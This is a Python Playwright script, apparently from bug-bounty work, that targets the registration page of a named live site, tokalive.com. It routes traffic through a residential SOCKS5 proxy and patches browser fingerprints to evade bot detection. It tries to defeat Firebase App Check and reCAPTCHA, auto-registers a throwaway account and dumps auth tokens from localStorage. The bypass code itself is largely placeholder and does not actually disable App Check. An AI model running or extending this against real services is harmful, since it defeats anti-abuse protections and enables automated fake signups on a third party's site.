"""
Tokalive.com — App Check bypass via initializeAppCheck interception
Strategy: Make initializeAppCheck a no-op so Firebase Auth initializes without App Check
"""
import json, sys, time
from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

# Use ThinkPad SOCKS5 proxy for residential IP
PROXY = "socks5://localhost:1080"

def log(msg):
    print(msg, flush=True)

def main():
    log("=== TOKALIVE APP CHECK BYPASS ===")
    log(f"Proxy: {PROXY}")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-web-security",  # May help with some CORS
            ],
            timeout=30000
        )
        
        context = browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 720},
            locale="es-DO",
            proxy={"server": PROXY},
        )
        
        # CRITICAL: Intercept App Check initialization BEFORE page loads
        context.add_init_script("""
            // === Anti-detection patches ===
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['es-DO', 'es', 'en-US'] });
            window.chrome = { runtime: {} };
            
            // === App Check bypass: override initializeAppCheck ===
            // The app calls: initializeAppCheck(app, { provider: new ReCaptchaV3Provider(key), ... })
            // If we make it a no-op, Firebase Auth may still work.
            const originalDefineProperty = Object.defineProperty;
            
            // Store reference to original Firebase functions before they're defined
            window.__disableAppCheck = true;
            
            // Intercept Firebase's getApp / initializeApp to patch appCheck settings
            const originalFetch = window.fetch;
            
            // Monitor for App Check token requests and block them
            window.__appCheckBlocked = 0;
        """)
        
        # Second init script that runs after Firebase is loaded but before app init
        context.add_init_script("""
            // This runs after first script, before any page JS
            // We'll intercept at a later stage via MutationObserver
        """)
        
        page = context.new_page()
        
        # Listen for console - don't filter, capture everything
        all_console = []
        page.on("console", lambda msg: all_console.append(f"[{msg.type}] {msg.text[:300]}"))
        
        # Intercept network requests
        page.on("request", lambda req: None)  # Just for monitoring
        
        # Load page
        log("Loading tokalive.com/register...")
        try:
            page.goto("https://tokalive.com/register", timeout=30000, wait_until="domcontentloaded")
            log(f"URL: {page.url}")
        except PWTimeout as e:
            log(f"Timeout: {e}")
            log(f"Current URL: {page.url}")
        
        time.sleep(5)
        
        # Check page state
        title = page.title()
        log(f"Title: {title}")
        
        inputs = page.query_selector_all("input")
        log(f"Inputs: {len(inputs)}")
        for i, inp in enumerate(inputs):
            info = page.evaluate(f"""el => ({
                type: el.type,
                name: el.name,
                id: el.id,
                placeholder: el.placeholder,
                className: (el.className || '').substring(0, 30)
            })""", inp)
            log(f"  [{i}] {json.dumps(info)}")
        
        buttons = page.query_selector_all("button")
        log(f"Buttons: {len(buttons)}")
        for btn in buttons:
            log(f"  \"{btn.inner_text()[:60]}\"")
        
        page.screenshot(path="/root/bounty/tokalive/tl_step4_bypass1.png")
        log("Screenshot saved")
        
        # Now try to intercept the App Check by overriding at a deeper level
        # Run JS to patch Firebase appCheck AFTER the page loaded
        eval_result = page.evaluate("""() => {
            const results = {};
            
            // Check if Firebase App Check is available
            try {
                // Try to access Firebase modules
                if (typeof firebase !== 'undefined') {
                    results.firebase_global = true;
                    results.firebase_apps = firebase.apps ? firebase.apps.length : 0;
                } else {
                    results.firebase_global = false;
                }
            } catch(e) { results.firebase_error = e.message; }
            
            // Check for __FIREBASE__
            if (typeof __FIREBASE__ !== 'undefined') {
                results.firebase_internal = true;
            }
            
            // Check localStorage for Firebase persisted state
            results.localStorage_keys = [];
            results.localStorage_firebase = {};
            for (let i = 0; i < localStorage.length; i++) {
                const k = localStorage.key(i);
                results.localStorage_keys.push(k);
                if (k.includes('firebase') || k.includes('token')) {
                    try {
                        results.localStorage_firebase[k] = localStorage.getItem(k).substring(0, 100);
                    } catch(e) {}
                }
            }
            
            // Check for reCAPTCHA iframes
            results.recaptcha_frames = document.querySelectorAll('iframe[src*=\"recaptcha\"]').length;
            results.recaptcha_divs = document.querySelectorAll('.g-recaptcha').length;
            
            return results;
        }""")
        
        log(f"\nPage evaluation: {json.dumps(eval_result, indent=2, default=str)}")
        
        # Try to sign up - assume we're on register page
        if len(inputs) >= 2:
            email_field = None
            pass_field = None
            
            for inp in inputs:
                info = page.evaluate(f"""el => ({
                    type: el.type,
                    placeholder: (el.placeholder || '').toLowerCase(),
                    name: el.name
                })""", inp)
                
                if "email" in info.get("placeholder", "") or info.get("type") == "email":
                    email_field = inp
                if info.get("type") == "password":
                    pass_field = inp
            
            if email_field and pass_field:
                test_email = f"test{int(time.time())}@protonmail.com"
                email_field.fill(test_email)
                log(f"Filled email: {test_email}")
                pass_field.fill("TestPass123!")
                log("Filled password")
                time.sleep(1)
                
                # Find and click submit button
                for btn in buttons:
                    txt = btn.inner_text().lower()
                    if any(w in txt for w in ["crear", "registr", "empezar", "unirse", "crear cuenta"]):
                        log(f"Clicking: {btn.inner_text()}")
                        btn.click()
                        time.sleep(5)
                        break
                else:
                    # Click any button
                    if buttons:
                        log(f"Clicking first button: {buttons[0].inner_text()}")
                        buttons[0].click()
                        time.sleep(5)
        
        # Check result
        log(f"\nFinal URL: {page.url}")
        page.screenshot(path="/root/bounty/tokalive/tl_step5_bypass2.png")
        
        # Check for auth tokens again
        try:
            tokens = page.evaluate("""() => {
                const r = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    try {
                        const v = localStorage.getItem(k);
                        if (k.includes('firebase') || k.includes('token') || k.includes('user') || k.includes('auth')) {
                            r[k] = v.substring(0, 500);
                        }
                    } catch(e) {}
                }
                return r;
            }""")
            log(f"\nLocalStorage tokens: {json.dumps(tokens, indent=2, default=str)}")
        except Exception as e:
            log(f"Token extraction error: {e}")
        
        # Console errors
        errors = [l for l in all_console if l.startswith("[error")]
        log(f"\nConsole errors ({len(errors)}):")
        for e in errors[-10:]:
            log(f"  {e}")
        
        browser.close()
        log("\n=== DONE ===")

if __name__ == "__main__":
    main()
